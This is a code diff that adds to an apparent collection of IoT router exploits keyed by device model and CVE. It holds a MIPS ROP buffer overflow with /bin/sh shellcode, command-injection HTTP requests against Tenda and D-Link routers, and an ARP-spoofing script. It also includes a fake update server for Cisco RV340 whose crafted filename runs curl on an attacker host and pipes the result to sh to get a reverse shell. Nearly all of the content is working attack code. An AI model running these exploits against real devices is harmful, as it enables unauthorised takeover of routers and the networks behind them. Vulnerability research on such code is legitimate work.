+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate",
+    "Content-Type": "text/plain",
+    "Content-Length": "78",
+    "Origin": "http://192.168.0.1",
+    "Connection": "close",
+    "Referer": "http://192.168.0.1/"
+}
+
+
+libcmm_base = 0x2b985000
+file_base = 0x58800000
+libuclibc_base = 0x2bcdf000
+
+gadget_1 = 0x000369E4
+gadget_2 = 0x00058894
+gadget_3 = 0x0003FD8C
+
+shellcode = "\\x66\\x06\\x06\\x24" + "\\xff\\xff\\xd0\\x04" + "\\xff\\xff\\x06\\x28" + "\\xe0\\xff\\xbd\\x27"+ "\\x01\\x10\\xe4\\x27" + "\\x1f\\xf0\\x84\\x24" + "\\xe8\\xff\\xa4\\xaf"+ "\\xec\\xff\\xa0\\xaf" + "\\xe8\\xff\\xa5\\x27"+ "\\xab\\x0f\\x02\\x24" + "\\x0c\\x01\\x01\\x01"+ "/bin/sh"
+
+payload = b'a' * (0x580 - 0x68)
+payload += p32(file_base + 0xa780)      # v27
+payload += b'b' * 4       
+payload += p32(libuclibc_base + 0x56D20)  # s0
+payload += b'c' * (0x5ac - 0x588 - 0x4)
+payload += p32(libuclibc_base + gadget_1) # ra = gadget
+
+payload += b'd' * 0x20
+payload += p32(libuclibc_base + gadget_3)
+payload += p32(libuclibc_base + gadget_2)
+payload += b'e' * 0x34
+
+payload += shellcode
+
+
+str_payload = ""
+
+for p in payload:
+  str_payload += chr(p)
+
+formdata = "[/cgi/auth#0,0,0,0,0,0#0,0,0,0,0,0]0,3\\r\\nname=admin\\r\\noldPwd=admin\\r\\npwd={}\\r\\n".format(str_payload)
+
+url = "http://192.168.0.1/cgi?8"
+response = requests.post(url, data=formdata, headers=headers)
+print(formdata)
+print(response.text)
+ """
+ ]
+}
+
+
+model_exp_dic["Tenda_AX1806"] = {
+    "CVE-2022-34597":
+["Tenda AX1806 v1.0.0.1 was discovered to contain a command injection vulnerability via the function WanParameterSetting.\n['https://github.com/zhefox/IOT_Vul/blob/main/Tenda/TendaAX1806/readme_en.md']",
+ """
+#affect US_AX1806V21brv1001cn2988ZGDX01.zip
+POST /goform/WanParameterSetting?0.8762489734485668 HTTP/1.1
+Host: i92.168.68.150
+Connection: close
+Content-Length: 191
+sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
+Accept: */*
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36
+sec-ch-ua-platform: "macOS"
+Origin: https://i92.168.68.150
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://192.168.2.1/main.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: password=edeff4d6d98974e46457a587e2e724a2ndy5gk
+
+wanType=2&adslUser=aaaa&adslPwd=$(ls > /tmp/xxx)&vpnServer=&vpnUser=&vpnPwd=&vpnWanType=l&dnsAuto=1&staticIp=&mask=&gateway=&dnsl=&dns2=&module=wanl&downSpeedLimit=
+ """
+ ]
+}
 # print(model_exp_dic["TOTOLINK_A7000R"][0])
+
+model_exp_dic["Cisco_RV340"] = {
+    "CVE-2022-20827":
+["Multiple vulnerabilities in Cisco Small Business RV160, RV260, RV340, and RV345 Series Routers could allow an unauthenticated, remote attacker to execute arbitrary code or cause a denial of service (DoS) condition on an affected device. For more information about these vulnerabilities, see the Details section of this advisory.\n['https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sb-mult-vuln-CbVp4SUR']",
+ """
+ #arp spoof
+import os
+from tabnanny import verbose
+
+from numpy import broadcast
+from scapy.all import *
+import requests
+
+gateway_ip = "192.168.1.1"          # cisco ip address
+fake_gateway_ip = "192.168.1.127"   # ubuntu ip address
+
+def arpspoof(gateway_ip,fake_gateway_mac):
+    packet = ARP(op=2,pdst="0.0.0.0",psrc=gateway_ip,hwsrc=fake_gateway_mac)        # arp广播
+    send(packet,verbose=False)
+
+def exp():
+    #fake_gateway_mac = get_mac(fake_gateway_ip)
+    try:
+        sent_packets_count = 0
+        while True:
+            arpspoof(gateway_ip,"00:0c:29:9f:9f:4a")
+            #arpspoof(attack_ip,gateway_ip)
+            sent_packets_count += 1
+            print("[*] Packets Sent "+str(sent_packets_count))
+            os.system("arp -a|grep 192.168.1.1")
+            time.sleep(2)
+
+    except KeyboardInterrupt:
+        print("\nCtrl + C pressed.............Exiting")
+        print("[+] Arp Spoof Stopped")
+
+exp()
+ """
+ ],
+    "CVE-2022-20827":
+["Multiple vulnerabilities in Cisco Small Business RV160, RV260, RV340, and RV345 Series Routers could allow an unauthenticated, remote attacker to execute arbitrary code or cause a denial of service (DoS) condition on an affected device. For more information about these vulnerabilities, see the Details section of this advisory.\n['https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sb-mult-vuln-CbVp4SUR']",
+ """
+from wsgiref.util import request_uri
+from simple_http_server import *
+import simple_http_server.server as server
+import requests
+
+filename = "full_bcdb_rep_1m_8.334.bin"
+payload = "full_bcdb_rep_1m_8.334`curl${IFS}192.168.1.127|sh`.bin"
+# download reverse_shell.sh
+
+@request_map('/',method=["POST"])
+def index_ctroller_function():
+    xmldata = '''
+    <?xml version="1.0" encoding="UTF-8" ?>
+    <?BrightCloud version=bcap/1.1?>
+    <bcap>
+        <seqnum>1</seqnum>
+        <status>200</status>
+        <statusmsg>OK</statusmsg>
+        <response>
+        <status>200</status>
+        <statusmsg>OK</statusmsg>
+        <filename>%s</filename>
+        <checksum>896bb64c7dd8661535b5cbe55fe7c17e</checksum>
+        <updateMajorVersion>8</updateMajorVersion>
+        <updateMinorVersion>334</updateMinorVersion>
+        <targetchecksum>896bb64c7dd8661535b5cbe55fe7c17e</targetchecksum>
+        </response>
+    </bcap>
+    '''%payload
+    return xmldata
+
+@request_map("/",method=['GET'])
+def reverseshell_ctroller_function():
+    return StaticFile("./opentelnet")
+
+def main(*args):
+    server.start(port=80)
+
+if __name__ == "__main__":
+    main()
+ """
+]
+}
+
+
+#model_exp_dic["Netgear_WNDR3700v4"]  = {
+#    "":
+#        []
+#}
+
+
+
+#model_exp_dic["Netgear_RAX120"] = {
+#    ""
+#}
+
+model_exp_dic["DIR-867"] = {
+    "CVE-2023-24762":
+["OS Command injection vulnerability in D-Link DIR-867 DIR_867_FW1.30B07 allows attackers to execute arbitrary commands via a crafted LocalIPAddress parameter for the SetVirtualServerSettings to HNAP1.\n['https://hackmd.io/@uuXne2y3RjOdpWM87fw6_A/HyPK04zho\nhttps://www.dlink.com/en/security-bulletin/']",
+ """
+POST /HNAP1/ HTTP/1.1
+Host: 192.168.0.1
+Content-Length: 1079
+Accept: text/xml
+HNAP_AUTH: ABBBBA0CF0001BB54C5D2F21EA7C927A 1674890990172
+SOAPACTION: "http://purenetworks.com/HNAP1/SetVirtualServerSettings"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+Content-Type: text/xml
+Origin: http://192.168.0.1
+Referer: http://192.168.0.1/VirtualServer.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: uid=HYRsduuM
+Connection: close
+
+<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+	<soap:Body>
+		<SetVirtualServerSettings>
+			<VirtualServerList>
+				<VirtualServerInfo>
+					<Enabled>true</Enabled>
+					<VirtualServerDescription>HTTPS</VirtualServerDescription>
+					<ExternalPort>443</ExternalPort>
+					<InternalPort>443</InternalPort>
+					<ProtocolType>TCP</ProtocolType>
+					<ProtocolNumber>6</ProtocolNumber>
+					<LocalIPAddress>192.;touch pz1o</LocalIPAddress>
+					<ScheduleName>Always</ScheduleName>
+				</VirtualServerInfo>
+			<VirtualServerInfo><Enabled>true</Enabled><VirtualServerDescription>H323</VirtualServerDescription><LocalIPAddress>192.168.0.161</LocalIPAddress><ProtocolType>TCP</ProtocolType><ProtocolNumber>6</ProtocolNumber><ExternalPort>1720</ExternalPort><InternalPort>1720</InternalPort><ScheduleName>Always</ScheduleName></VirtualServerInfo></VirtualServerList>
+		</SetVirtualServerSettings>
+	</soap:Body>
+</soap:Envelope>
+ """
+ ]
+}
